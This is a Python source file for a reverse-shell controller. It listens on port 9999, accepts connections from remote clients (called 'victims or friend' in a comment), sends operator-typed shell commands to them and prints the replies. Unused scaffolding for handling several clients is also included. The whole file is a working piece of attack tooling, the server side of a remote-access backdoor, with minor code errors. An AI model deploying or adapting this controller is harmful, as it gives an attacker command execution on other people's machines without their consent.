#!/usr/bin/env python3
import sys
import time
import socket
import threading
from queue import Queue as queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
connections_list = []
address_list = []


# Create a socket (connect two computers)
def create_socket():
    try:
        global host
        global port
        global sock
        host = ""
        port = 9999
        sock = socket.socket()
    except socket.error() as msg:
        print("Socket creation error: " + str(msg))


# Sending the socket and listening for connection
def bind_socket():
    try:
        global host
        global port
        global sock
        print("Binding the Port " + str(port))

        sock.bind((host, port))
        sock.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying")
        bind_socket()


############################################
# Handling connection for multiple client
# Saving to a list
############################################
# Closing previous connections when server file is restarted
def accepting_connection():
    for c in connections_list:
        c.close()

    del connections_list[:]
    del address_list[:]

    while True:
        try:
            conn, address = sock.accept()
            sock.setblocking(True)  # prevents timeout
            connections_list.append(conn)
            address_list.append(address)
            print("Connection has been established: " + address[0])
        except socket.error as err:
            print("Error accepting connection " + str(err))


############################################
# Handling connection for single client
############################################
# Establish connection with client (socket must be listening)
def socket_accept():
    conn, address = sock.accept()
    print("Connection has been established! |" + " IP" + address[0] + " | Port " + str(address[1]))
    send_commands(conn)
    conn.close()


# Send command to client / victims or friend
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            sock.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), 'utf-8')
            print(client_response, end='')


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()
